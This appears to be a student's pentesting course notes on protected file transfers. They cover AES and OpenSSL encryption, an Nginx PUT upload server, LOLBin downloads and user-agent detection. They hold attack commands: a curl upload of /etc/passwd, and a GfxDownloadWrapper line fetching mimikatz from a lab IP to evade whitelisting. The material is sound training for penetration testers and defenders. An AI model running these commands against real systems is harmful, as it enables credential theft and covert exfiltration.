## Protected File Transfers

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Why protect|Pentesters gain access to sensitive data (user lists, credentials, NTDS.dit, enumeration data, AD environment info)|
|Recommendation|Encrypt data or use encrypted connections (SSH, SFTP, HTTPS)|
|Ethical note|Unless requested by client, do NOT exfiltrate PII, financial data, trade secrets; use dummy data to test DLP/egress filtering|
|Risk|Data leakage → severe consequences for pentester, company, client|
|**File Encryption on Windows**||
|Script|`Invoke-AESEncryption.ps1` — small PowerShell script for encrypting files and strings|
|Usage examples|`Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"` (encrypt string → Base64 ciphertext)|
| |`Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="` (decrypt Base64 → plain text)|
| |`Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin` (encrypt file → `file.bin.aes`)|
| |`Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes` (decrypt → `file.bin`)|
|Key details|SHA256 hash of key → AES key; CBC mode; Zeros padding; BlockSize 128; KeySize 256|
|Import module|`Import-Module .\Invoke-AESEncryption.ps1`|
|Encrypt file|`Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt` → `scan-results.txt.aes`|
|Best practice|Use very strong and unique passwords for encryption for every company; prevents decryption from leaked/cracked single password|
|**File Encryption on Linux**||
|Tool|OpenSSL — frequently included in Linux distributions|
|Encrypt|`openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`|
|Options|`-aes256` cipher; `-iter 100000` iterations; `-pbkdf2` Password-Based Key Derivation Function 2|
|Decrypt|`openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`|
|Best practice|Use strong and unique password to avoid brute-force cracking|
|Transfer|Use any previous methods; recommended secure transport: HTTPS, SFTP, or SSH|

## Catching Files over HTTP/S

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Why HTTP/S|Most common protocols allowed through firewalls; files often encrypted in transit|
|Risk|Plaintext transfer can trigger network IDS → sensitive file exposed|
|Options|Python3 `uploadserver` module, Apache, or Nginx|
|**Nginx — Enabling PUT**||
|Why Nginx|Less complicated configuration; module system doesn't lead to security issues like Apache|
|Security critical|Ensure users cannot upload web shells and execute them; Apache + PHP module easily executes anything ending in PHP; Nginx + PHP is not simple|
|Create upload directory|`sudo mkdir -p /var/www/uploads/SecretUploadDirectory`|
|Change owner|`sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`|
|Create Nginx config file|`/etc/nginx/sites-available/upload.conf`: `server { listen 9001; location /SecretUploadDirectory/ { root /var/www/uploads; dav_methods PUT; } }`|
|Symlink to sites-enabled|`sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`|
|Start Nginx|`sudo systemctl restart nginx.service`|
|**Verifying Errors**||
|Check log|`tail -2 /var/log/nginx/error.log`|
|Error example|`bind() to 0.0.0.0:80 failed (98: Address already in use)`|
|Check port 80|`ss -lnpt \| grep 80`|
|Find process|`ps -ef \| grep 2811` (e.g., `python -m websockify 80 localhost:5901 -D`)|
|Remove default config|`sudo rm /etc/nginx/sites-enabled/default`|
|**Upload File Using cURL**||
|Command|`curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt`|
|Verify|`sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt` → `user65:x:1000:1000:,,,:/home/user65:/bin/bash`|
|**Directory Listing Test**||
|Check|Navigate to `http://localhost/SecretUploadDirectory`|
|Apache default|Lists all files if no index file (index.html) — bad for exfiltration (files are sensitive)|
|Nginx default|Directory listing not enabled by default (minimal)|

|**LOLBAS / GTFOBins**||
|Use case|Application whitelisting may prevent PowerShell/Netcat; command-line logging may alert defenders|
|LOLBIN|Living off the land binary / "misplaced trust binaries"|
|Example|Intel Graphics Driver for Windows 10 (`GfxDownloadWrapper.exe`); downloads configuration files periodically|
|`GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"`|Transfer file with GfxDownloadWrapper.exe|
|Benefit|Such binary may be permitted by application whitelisting and excluded from alerting|
|Other options|Check LOLBAS project for suitable "file download" binary in environment; GTFOBins for Linux (~40 commonly installed binaries for file transfers)|
|**Closing Thoughts**||
|Practice|Try as many methods as possible; web shell → Certutil; download off target → Impacket SMB server or Python web server with upload capabilities|
|Tip|Search for a LOLBin or GTFOBin never used before to accomplish file transfer goals|

## Detection

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Command-line detection|Blacklisting easy to bypass (case obfuscation); whitelisting robust, allows quick detection/alerting on unusual command lines|
|Client-server negotiation|HTTP most common; user agent string identifies HTTP client (Firefox, Chrome, cURL, custom Python script, sqlmap, Nmap)|
|Detection approach|Build list of known legitimate user agent strings (default OS processes, update services, AV updates); feed into SIEM for threat hunting; filter legitimate traffic; focus on anomalies|
|Resources|Website for identifying common user agent strings; list of user agent strings available|
